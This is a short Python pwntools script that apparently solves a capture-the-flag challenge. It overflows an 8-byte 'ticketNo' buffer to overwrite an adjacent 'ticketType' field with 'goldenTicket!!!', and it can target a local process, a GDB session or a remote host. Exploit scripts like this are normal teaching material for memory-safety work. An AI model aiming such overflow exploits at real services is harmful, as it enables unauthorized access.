from pwn import *

elf = ELF("challenge")

context.binary = elf
context.terminal = ['kitty']
gs = '''
b main
'''

def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs) 
    elif args.R:
        return remote(args.HOST, args.PORT)
    else:
        return process(elf.path)

def unpack(leak):
    return u64(leak.strip()) # type: ignore

p = run()

p.recvuntil(b": ")
# Sending 8 random characters to fill in the first buffer ("ticketNo")
# and overwrite the second buffer ("ticketType") by overflowing as to change the ticket type to "goldenTicket!!!"
p.sendline(cyclic(8) + b"goldenTicket!!!")

p.interactive()

